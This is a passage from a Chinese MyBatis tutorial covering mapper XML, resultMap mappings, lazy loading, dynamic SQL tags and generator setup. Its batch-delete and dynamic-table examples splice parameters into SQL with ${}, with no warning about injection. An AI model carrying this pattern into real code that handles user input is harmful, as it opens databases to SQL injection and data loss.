\u0026#39;%${mohu}%\u0026#39;--\u0026gt; \u0026lt;!--select * from t_user where username like concat(\u0026#39;%\u0026#39;,#{mohu},\u0026#39;%\u0026#39;)--\u0026gt; select * from t_user where username like \u0026#34;%\u0026#34;#{mohu}\u0026#34;%\u0026#34; \u0026lt;/select\u0026gt; 其中select * from t_user where username like \u0026quot;%\u0026quot;#{mohu}\u0026quot;%\u0026quot;是最常用的 5.2 批量删除 只能使用${}，如果使用#{}，则解析后的sql语句为delete from t_user where id in ('1,2,3')，这样是将1,2,3看做是一个整体，只有id为1,2,3的数据会被删除。正确的语句应该是delete from t_user where id in (1,2,3)，或者delete from t_user where id in ('1','2','3')\n1 2 3 4 5 6 7 /** * 根据id批量删除 * @param ids * @return int * @date 2022/2/26 22:06 */ int deleteMore(@Param(\u0026#34;ids\u0026#34;) String ids); 1 2 3 \u0026lt;delete id=\u0026#34;deleteMore\u0026#34;\u0026gt; delete from t_user where id in (${ids}) \u0026lt;/delete\u0026gt; 5.3 动态设置表名 只能使用${}，因为表名不能加单引号\n1 2 3 4 5 6 7 /** * 查询指定表中的数据 * @param tableName * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.User\u0026gt; * @date 2022/2/27 14:41 */ List\u0026lt;User\u0026gt; getUserByTable(@Param(\u0026#34;tableName\u0026#34;) String tableName); 1 2 3 4 \u0026lt;!--List\u0026lt;User\u0026gt; getUserByTable(@Param(\u0026#34;tableName\u0026#34;) String tableName);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByTable\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from ${tableName} \u0026lt;/select\u0026gt; 5.4 添加功能获取自增的主键 使用场景\nt_clazz(clazz_id,clazz_name)\nt_student(student_id,student_name,clazz_id) 添加班级信息 获取新添加的班级的id 为班级分配学生，即将某学的班级id修改为新添加的班级的id 在mapper.xml中设置两个属性\nuseGeneratedKeys：设置使用自增的主键\nkeyProperty：因为增删改有统一的返回值是受影响的行数，因此只能将获取的自增的主键放在传输的参数user对象的某个属性中\n1 2 3 4 5 6 /** * 添加用户信息 * @param user * @date 2022/2/27 15:04 */ void insertUser(User user); 1 2 3 4 \u0026lt;!--void insertUser(User user);--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34; useGeneratedKeys=\u0026#34;true\u0026#34; keyProperty=\u0026#34;id\u0026#34;\u0026gt; insert into t_user values (null,#{username},#{password},#{age},#{sex},#{email}) \u0026lt;/insert\u0026gt; 1 2 3 4 5 6 7 8 9 10 //测试类 @Test public void insertUser() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); SQLMapper mapper = sqlSession.getMapper(SQLMapper.class); User user = new User(null, \u0026#34;ton\u0026#34;, \u0026#34;123\u0026#34;, 23, \u0026#34;男\u0026#34;, \u0026#34;123@321.com\u0026#34;); mapper.insertUser(user); System.out.println(user); //输出：user{id=10, username=\u0026#39;ton\u0026#39;, password=\u0026#39;123\u0026#39;, age=23, sex=\u0026#39;男\u0026#39;, email=\u0026#39;123@321.com\u0026#39;}，自增主键存放到了user的id属性中 } 因为如果不设置useGeneratedKeys,我们插入之后，得到的这个user对象的id没有设置，仍为null，假如它的目的即为将数据插入到数据库中得到的id返回给后端的user对象，对其赋值\n6 自定义映射resultMap resultMap：设置自定义映射 属性： id：表示自定义映射的唯一标识，不能重复 type：查询的数据要映射的实体类的类型 子标签： id：设置主键的映射关系 result：设置普通字段的映射关系 子标签属性： property：设置映射关系中实体类中的属性名 column：设置映射关系中表中的字段名 6.1 一对一映射 若字段名和实体类中的属性名不一致，则可以通过resultMap设置自定义映射，即使字段名和属性名一致的属性也要映射，也就是全部属性都要列出来\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;resultMap id=\u0026#34;empResultMap\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--List\u0026lt;Emp\u0026gt; getAllEmp();--\u0026gt; \u0026lt;select id=\u0026#34;getAllEmp\u0026#34; resultMap=\u0026#34;empResultMap\u0026#34;\u0026gt; select * from t_emp \u0026lt;/select\u0026gt; 若字段名和实体类中的属性名不一致，但是字段名符合数据库的规则（使用_），实体类中的属性名符合Java的规则（使用驼峰）。此时也可通过以下两种方式处理字段名和实体类中的属性的映射关系\nsql语句中字段起别名\n1 select eid,emp_name empName,age,sex,email from t_emp 开启mapUnderscoreToCamelCase\n1 2 3 \u0026lt;settings\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; 6.2 多对一映射 1 2 3 4 5 6 7 8 9 public class Emp { private Integer eid; private String empName; private Integer age; private String sex; private String email; private Dept dept; //...构造器、get、set方法等 } 级联方式处理映射关系\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;resultMap id=\u0026#34;empAndDeptResultMapOne\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;dept.did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;dept.deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDept(@Param(\u0026#34;eid\u0026#34;)Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDept\u0026#34; resultMap=\u0026#34;empAndDeptResultMapOne\u0026#34;\u0026gt; select * from t_emp left join t_dept on t_emp.eid = t_dept.did where t_emp.eid = #{eid} \u0026lt;/select\u0026gt; 使用association处理映射关系\nassociation：处理多对一的映射关系 property：需要处理多对的映射关系的属性名 javaType：该属性的类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;resultMap id=\u0026#34;empAndDeptResultMapTwo\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;association property=\u0026#34;dept\u0026#34; javaType=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/association\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDept(@Param(\u0026#34;eid\u0026#34;)Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDept\u0026#34; resultMap=\u0026#34;empAndDeptResultMapTwo\u0026#34;\u0026gt; select * from t_emp left join t_dept on t_emp.eid = t_dept.did where t_emp.eid = #{eid} \u0026lt;/select\u0026gt; 分布查询\n其实就是将另一条mapper实现的sql语句根据select=\u0026quot;com.atguigu.mybatis.mapper.DeptMapper.getEmpAndDeptByStepTwo\u0026quot; column=\u0026quot;did\u0026quot;导入进来\n查询员工信息\nselect：设置分布查询的sql的唯一标识（namespace.SQLId或mapper接口的全类名.方法名） column：设置分步查询的条件 1 2 3 4 5 6 7 8 9 //EmpMapper里的方法 /** * 通过分步查询，员工及所对应的部门信息 * 分步查询第一步：查询员工信息 * @param * @return com.atguigu.mybatis.pojo.Emp * @date 2022/2/27 20:17 */ Emp getEmpAndDeptByStepOne(@Param(\u0026#34;eid\u0026#34;) Integer eid); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;resultMap id=\u0026#34;empAndDeptByStepResultMap\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;association property=\u0026#34;dept\u0026#34; select=\u0026#34;com.atguigu.mybatis.mapper.DeptMapper.getEmpAndDeptByStepTwo\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/association\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDeptByStepOne(@Param(\u0026#34;eid\u0026#34;) Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDeptByStepOne\u0026#34; resultMap=\u0026#34;empAndDeptByStepResultMap\u0026#34;\u0026gt; select * from t_emp where eid = #{eid} \u0026lt;/select\u0026gt; 查询部门信息\n1 2 3 4 5 6 7 8 9 //DeptMapper里的方法 /** * 通过分步查询，员工及所对应的部门信息 * 分步查询第二步：通过did查询员工对应的部门信息 * @param * @return com.atguigu.mybatis.pojo.Emp * @date 2022/2/27 20:23 */ Dept getEmpAndDeptByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!--此处的resultMap仅是处理字段和属性的映射关系--\u0026gt; \u0026lt;resultMap id=\u0026#34;EmpAndDeptByStepTwoResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getEmpAndDeptByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDeptByStepTwo\u0026#34; resultMap=\u0026#34;EmpAndDeptByStepTwoResultMap\u0026#34;\u0026gt; select * from t_dept where did = #{did} \u0026lt;/select\u0026gt; 6.3 一对多映射处理 1 2 3 4 5 6 public class Dept { private Integer did; private String deptName; private List\u0026lt;Emp\u0026gt; emps; //...构造器、get、set方法等 } collection\ncollection：用来处理一对多的映射关系 ofType：表示该属性对饮的集合中存储的数据的类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;resultMap id=\u0026#34;DeptAndEmpResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;collection property=\u0026#34;emps\u0026#34; ofType=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/collection\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getDeptAndEmp(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmp\u0026#34; resultMap=\u0026#34;DeptAndEmpResultMap\u0026#34;\u0026gt; select * from t_dept left join t_emp on t_dept.did = t_emp.did where t_dept.did = #{did} \u0026lt;/select\u0026gt; 分步查询\n查询部门信息\n1 2 3 4 5 6 7 8 /** * 通过分步查询，查询部门及对应的所有员工信息 * 分步查询第一步：查询部门信息 * @param did * @return com.atguigu.mybatis.pojo.Dept * @date 2022/2/27 22:04 */ Dept getDeptAndEmpByStepOne(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;resultMap id=\u0026#34;DeptAndEmpByStepOneResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;collection property=\u0026#34;emps\u0026#34; select=\u0026#34;com.atguigu.mybatis.mapper.EmpMapper.getDeptAndEmpByStepTwo\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/collection\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getDeptAndEmpByStepOne(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmpByStepOne\u0026#34; resultMap=\u0026#34;DeptAndEmpByStepOneResultMap\u0026#34;\u0026gt; select * from t_dept where did = #{did} \u0026lt;/select\u0026gt; 根据部门id查询部门中的所有员工\n1 2 3 4 5 6 7 8 /** * 通过分步查询，查询部门及对应的所有员工信息 * 分步查询第二步：根据部门id查询部门中的所有员工 * @param did * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.Emp\u0026gt; * @date 2022/2/27 22:10 */ List\u0026lt;Emp\u0026gt; getDeptAndEmpByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 \u0026lt;!--List\u0026lt;Emp\u0026gt; getDeptAndEmpByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmpByStepTwo\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp where did = #{did} \u0026lt;/select\u0026gt; 7 延迟加载 在mybatis-config.xml里面配置延迟加载\nlazyLoadingEnabled：延迟加载的全局开关。当开启时，所有关联对象都会延迟加载 aggressiveLazyLoading：当开启时，任何方法的调用都会加载该对象的所有属性。 否则，每个属性会按需加载 1 2 3 4 \u0026lt;settings\u0026gt; \u0026lt;!--开启延迟加载--\u0026gt; \u0026lt;setting name=\u0026#34;lazyLoadingEnabled\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; 开启延迟加载后，查询相关内容是，只有需要用到的时候，服务才去调用相应的程序。\n8 动态sql 8.1 if if标签可通过test属性（即传递过来的数据）的表达式进行判断，若表达式的结果为true，则标签中的内容会执行；反之标签中的内容不会执行 在where后面添加一个恒成立条件1=1 这个恒成立条件并不会影响查询的结果 这个1=1可以用来拼接and语句，例如：当empName为null时 如果不加上恒成立条件，则SQL语句为select * from t_emp where and age = ? and sex = ? and email = ?，此时where会与and连用，SQL语句会报错 如果加上一个恒成立条件，则SQL语句为select * from t_emp where 1= 1 and age = ? and sex = ? and email = ?，此时不报错 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp where 1=1 \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and emp_name = #{empName} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and age = #{age} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and sex = #{sex} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; 8.2 where where和if一般结合使用：\n解决前面带有and 或者 or\n若where标签中的if条件都不满足，则where标签没有任何功能，即不会添加where关键字\n若where标签中的if条件满足，则where标签会自动添加where关键字，并将条件最前方多余的and/or去掉 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and age = #{age} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and sex = #{sex} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 注意：where标签不能去掉条件后多余的and/or\n1 2 3 4 5 6 7 \u0026lt;!--这种用法是错误的，只能去掉条件前面的and/or，条件后面的不行--\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} \u0026lt;/if\u0026gt; 8.3 trim trim用于去掉或添加标签中的内容\n解决后面带有and 或者 or\n常用属性\nprefix：在trim标签中的内容的前面添加某些内容\nsuffix：在trim标签中的内容的后面添加某些内容 prefixOverrides：在trim标签中的内容的前面去掉某些内容 suffixOverrides：在trim标签中的内容的后面去掉某些内容 若trim中的标签都不满足条件，则trim标签没有任何效果，也就是只剩下select * from t_emp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;trim prefix=\u0026#34;where\u0026#34; suffixOverrides=\u0026#34;and|or\u0026#34;\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; sex = #{sex} or \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/trim\u0026gt; \u0026lt;/select\u0026gt; 8.4 choose、when、otherwise choose、when、otherwise相当于if...else if..else\nwhen至少要有一个，otherwise至多只有一个\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;select id=\u0026#34;getEmpByChoose\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;where\u0026gt; \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;empName != null and empName != \u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;age != null and age != \u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;sex != null and sex != \u0026#39;\u0026#39;\u0026#34;\u0026gt; sex = #{sex} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;email != null and email != \u0026#39;\u0026#39;\u0026#34;\u0026gt; email = #{email} \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; did = 1 \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 8.5 foreach 属性：\ncollection：设置要循环的数组或集合\nitem：表示集合或数组中的每一个数据 separator：设置循环体之间的分隔符，分隔符前后默认有一个空格，如, open：设置foreach标签中的内容的开始符 close：设置foreach标签中的内容的结束符 批量删除\n1 2 3 4 5 6 7 8 9 \u0026lt;!--int deleteMoreByArray(Integer[] eids); int result = mapper.deleteMoreByArray(new Integer[]{6, 7, 8, 9}); --\u0026gt; \u0026lt;delete id=\u0026#34;deleteMoreByArray\u0026#34;\u0026gt; delete from t_emp where eid in \u0026lt;foreach collection=\u0026#34;eids\u0026#34; item=\u0026#34;eid\u0026#34; separator=\u0026#34;,\u0026#34; open=\u0026#34;(\u0026#34; close=\u0026#34;)\u0026#34;\u0026gt; #{eid} \u0026lt;/foreach\u0026gt; \u0026lt;/delete\u0026gt; 批量添加\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--int insertMoreByList(@Param(\u0026#34;emps\u0026#34;) List\u0026lt;Emp\u0026gt; emps); List\u0026lt;Emp\u0026gt; emps = Arrays.asList(emp1, emp2, emp3); int result = mapper.insertMoreByList(emps); --\u0026gt; \u0026lt;insert id=\u0026#34;insertMoreByList\u0026#34;\u0026gt; insert into t_emp values \u0026lt;foreach collection=\u0026#34;emps\u0026#34; item=\u0026#34;emp\u0026#34; separator=\u0026#34;,\u0026#34;\u0026gt; (null,#{emp.empName},#{emp.age},#{emp.sex},#{emp.email},null) \u0026lt;/foreach\u0026gt; \u0026lt;/insert\u0026gt; 8.6 sql 片段 sql片段，可以记录一段公共sql片段，在使用的地方通过include标签进行引入 声明sql片段：\u0026lt;sql\u0026gt;标签 1 \u0026lt;sql id=\u0026#34;empColumns\u0026#34;\u0026gt;eid,emp_name,age,sex,email\u0026lt;/sql\u0026gt; 引用sql片段：\u0026lt;include\u0026gt;标签 1 2 3 4 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select \u0026lt;include refid=\u0026#34;empColumns\u0026#34;\u0026gt;\u0026lt;/include\u0026gt; from t_emp \u0026lt;/select\u0026gt; 9 MyBatis的逆向工程 正向工程：先创建Java实体类，由框架负责根据实体类生成数据库表。Hibernate是支持正向工程的\n逆向工程：先创建数据库表，由框架负责根据数据库表，反向生成如下资源：\nJava实体类\nMapper接口 Mapper映射文件 添加依赖\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;dependencies\u0026gt; \u0026lt;!-- MyBatis核心依赖包 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.9\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- junit测试 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.13.2\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQL驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- log4j日志 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.17\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;!-- 控制Maven在构建过程中相关配置 --\u0026gt; \u0026lt;build\u0026gt; \u0026lt;!-- 构建过程中用到的插件 --\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!-- 具体插件，逆向工程的操作是以构建过程中插件形式出现的 --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.0\u0026lt;/version\u0026gt; \u0026lt;!-- 插件的依赖 --\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- 逆向工程的核心依赖 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 数据库连接池 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.mchange\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;c3p0\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.9.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQL驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; 创建逆向工程的配置文件\n文件名必须是：generatorConfig.xml 这里是mac下的路径，windows需要额外修改 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE generatorConfiguration PUBLIC \u0026#34;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\u0026#34;\u0026gt; \u0026lt;generatorConfiguration\u0026gt; \u0026lt;!-- targetRuntime: 执行生成的逆向工程的版本 MyBatis3Simple: 生成基本的CRUD（清新简洁版） MyBatis3: 生成带条件的CRUD（奢华尊享版） --\u0026gt; \u0026lt;context id=\u0026#34;DB2Tables\u0026#34; targetRuntime=\u0026#34;MyBatis3\u0026#34;\u0026gt; \u0026lt;!-- 